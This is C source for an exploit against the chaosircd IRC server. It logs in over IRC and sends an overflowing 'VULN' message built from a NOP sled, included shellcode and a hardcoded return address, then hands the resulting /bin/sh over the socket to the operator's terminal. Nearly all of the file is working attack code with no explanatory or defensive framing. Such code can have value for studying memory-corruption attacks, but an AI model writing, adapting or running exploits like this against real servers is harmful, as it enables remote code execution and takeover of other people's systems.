/* -------------------------------------------------------------------------- *
 * This exploits chaosircd and spawns /bin/sh on the socket                   *
 * -------------------------------------------------------------------------- */

#include <libchaos/config.h>
#include <libchaos/io.h>
#include <libchaos/log.h>
#include <libchaos/mem.h>
#include <libchaos/str.h>
#include <libchaos/ssl.h>
#include <libchaos/timer.h>
#include <libchaos/dlink.h>
#include <libchaos/connect.h>

#include <chaosircd/config.h>

//#define RETADDR 0x4003f6d0
//#define RETADDR 0x08099145
#define RETADDR 0x402de804
//#define RETADDR 0xbffff620
#define VULNSIZE 0x100

#include <shellcode.h>

int              sploit_log;
int              sploit_success = 0;
int              sploit_stdin;
int              sploit_sock;
struct connect  *sploit_connect;
struct protocol *sploit_proto;

/* -------------------------------------------------------------------------- */

void sploit_init(void)
{
  log(sploit_log, L_startup, "%s v%s sploit",
      PACKAGE_NAME, PACKAGE_VERSION, PACKAGE_RELEASE);

  log_init(STDOUT_FILENO, LOG_ALL, L_status);
  io_init_except(STDIN_FILENO, STDOUT_FILENO, STDERR_FILENO);

  sploit_stdin = io_new(STDIN_FILENO, FD_PIPE);

  mem_init();
  timer_init();
  connect_init();
  queue_init();
  dlink_init();
  str_init();
  net_init();
  ssl_init();

  sploit_log = log_source_register("sploit");
}

/* -------------------------------------------------------------------------- */

void sploit_shutdown(void)
{
  ssl_shutdown();
  net_shutdown();
  str_shutdown();
  io_shutdown();
  dlink_shutdown();
  queue_shutdown();
  log_shutdown();
  timer_shutdown();
  mem_shutdown();

  syscall_exit(1);
}

/* -------------------------------------------------------------------------- */

void sploit_write_shell(int fd)
{
  if(!sploit_success)
  {
    io_puts(fd, "uname -a\nid");
    io_unregister(fd, IO_CB_WRITE);
  }
}

/* -------------------------------------------------------------------------- */

void sploit_read_stdin(int fd)
{
  char   buf[512];
  size_t n;

  if(io_list[fd].status.closed || io_list[fd].status.err)
  {
    log(sploit_log, L_status, "Lost stdin!", buf);
    sploit_shutdown();
  }

  n = io_read(fd, buf, sizeof(buf));

  if(n >= 0)
    io_write(sploit_sock, buf, n);
}

/* -------------------------------------------------------------------------- */

void sploit_read_shell(int fd)
{
  char   buf[512];
  size_t n;

  if(io_list[fd].status.closed || io_list[fd].status.err)
  {
    log(sploit_log, L_status, "IRCD died!", buf);
    sploit_shutdown();
  }


  while((n = io_gets(fd, buf, sizeof(buf))) > 0)
  {
    if(!sploit_success)
    {
      if(buf[0] != ':')
      {
        sploit_success = 1;
        sploit_sock = fd;

        io_register(STDIN_FILENO, IO_CB_READ, sploit_read_stdin);
      }
      else
      {
        log(sploit_log, L_status, "Exploitation failed.");
        sploit_shutdown();
      }
    }

    buf[n - 1] = '\0';
    log(sploit_log, L_status, "%s", buf);
  }
}

/* -------------------------------------------------------------------------- */

void sploit_send(int fd)
{
  char payload[VULNSIZE + 1 + (8 * 4)];

  log(sploit_log, L_status, "Payload size is %u bytes.", sizeof(payload) -1);

  memset(payload, 0x90, sizeof(payload));

  memcpy(&payload[VULNSIZE - (sizeof(shellcode) - 1)], shellcode,
         sizeof(shellcode) - 1);

  log(sploit_log, L_status, "Trying retaddr %p..", RETADDR);

  *((void **)&payload[VULNSIZE]) = (void *)RETADDR;
  *((void **)&payload[VULNSIZE + 4]) = (void *)RETADDR;
  *((void **)&payload[VULNSIZE + 8]) = (void *)RETADDR;
  *((void **)&payload[VULNSIZE + 12]) = (void *)RETADDR;
  *((void **)&payload[VULNSIZE + 16]) = (void *)RETADDR;
  *((void **)&payload[VULNSIZE + 20]) = (void *)RETADDR;
  *((void **)&payload[VULNSIZE + 24]) = (void *)RETADDR;
  *((void **)&payload[VULNSIZE + 28]) = (void *)RETADDR;

  payload[sizeof(payload) - 1] = '\0';

  io_puts(fd, "VULN :%s", payload);

  io_register(fd, IO_CB_READ, sploit_read_shell);
  io_register(fd, IO_CB_WRITE, sploit_write_shell);
  io_set_events(fd, IO_WRITE|IO_READ);
}

/* -------------------------------------------------------------------------- */

void sploit_read_irc(int fd)
{
  char   buf[512];
  size_t n;

  while(io_list[fd].recvq.lines)
  {
    if((n = io_gets(fd, buf, sizeof(buf))) > 0)
    {
      if(!str_ncmp(buf, "PING", 4))
      {
        buf[1] = 'O';
        io_write(fd, buf, n);
      }
      else if(!str_ncmp(buf, ":sploit", 7))
      {
        log(sploit_log, L_status, "Logged in!", buf);
        sploit_send(fd);
      }
    }
  }
}

/* -------------------------------------------------------------------------- */

void sploit_handler(int fd, struct connect *cnptr)
{
  if(io_list[fd].status.closed || io_list[fd].status.err)
    sploit_shutdown();

  log(sploit_log, L_status, "Connected");

  io_unregister(fd, IO_CB_WRITE);
  io_register(fd, IO_CB_READ, sploit_read_irc);

  io_queue_control(fd, ON, OFF, ON);

  io_puts(fd, "USER sploit sploit sploit sploit");
  io_puts(fd, "NICK sploit");
}

/* -------------------------------------------------------------------------- */

void sploit_run(void)
{
  sploit_proto = net_register(NET_CLIENT, "sploit", sploit_handler);

  ssl_add("connect", SSL_CONTEXT_CLIENT,
          "/etc/chaosircd/ircd.crt", "/etc/chaosircd/ircd.key",
          "RSA+HIGH:RSA+MEDIUM:@STRENGTH");

  sploit_connect = connect_add("127.0.0.1", 6667, sploit_proto,
                               30000LLU, 0, 1, 0, "connect");

  connect_start(sploit_connect);
}

/* -------------------------------------------------------------------------- */

void sploit_loop(void)
{
  int ret = 0;
  int64_t *timeout;
  int64_t remain = 0LL;

  while(ret >= 0)
  {
    /* Calculate timeout value */
    timeout = timer_timeout();

    /* Do I/O multiplexing and event handling */
#if (defined USE_SELECT)
    ret = io_select(&remain, timeout);
#elif (defined USE_POLL)
    ret = io_poll(&remain, timeout);
#endif /* USE_SELECT | USE_POLL */

    /* Remaining time is 0msecs, we need to run a timer */
    if(remain == 0LL)
      timer_run();

    if(timeout)
      timer_drift(*timeout - remain);

    io_handle();

    timer_collect();
    /*    ircd_collect();*/
  }
}

/* -------------------------------------------------------------------------- */

int main()
{
  sploit_init();

  sploit_run();

  sploit_loop();

  sploit_shutdown();

  return 0;
}
